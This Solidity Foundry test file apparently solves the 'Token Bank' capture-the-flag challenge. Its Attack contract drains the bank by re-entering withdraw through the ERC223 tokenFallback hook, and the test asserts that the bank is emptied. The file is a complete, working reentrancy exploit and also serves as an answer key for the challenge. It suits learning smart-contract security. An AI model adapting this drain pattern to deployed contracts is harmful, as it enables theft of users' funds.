// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract Attack {
    TokenBankChallenge target;

    constructor(address _target) {
        target = TokenBankChallenge(_target);
    }

    function deposit() external {
        uint256 ourBalance = target.token().balanceOf(address(this));
        target.token().transfer(address(target), ourBalance);
    }

    function attack() external payable {
        withdraw();
        require(target.isComplete(), "Failed to drain the bank");
    }

    function withdraw() public {
        uint256 ourBalance = target.balanceOf(address(this));
        uint256 bankBalance = target.token().balanceOf(address(target));

        if (bankBalance > 0) {
            target.withdraw(
                ourBalance < bankBalance ? ourBalance : bankBalance
            );
        }
    }

    function tokenFallback(address from, uint256, bytes calldata) external {
        if (from != address(target)) return;
        withdraw();
    }
}

contract TokenBankTest is Test {
    TokenBankChallenge public target;
    address player = vm.addr(1);

    function setUp() public {
        vm.startPrank(address(player));
        target = new TokenBankChallenge(address(player));
    }

    function testChallenge() public {
        Attack attack = new Attack(address(target));
        target.withdraw(target.balanceOf(address(player)));
        target.token().transfer(
            address(attack),
            target.balanceOf(address(player))
        );
        attack.deposit();
        attack.attack();
        assertTrue(target.isComplete());
    }
}
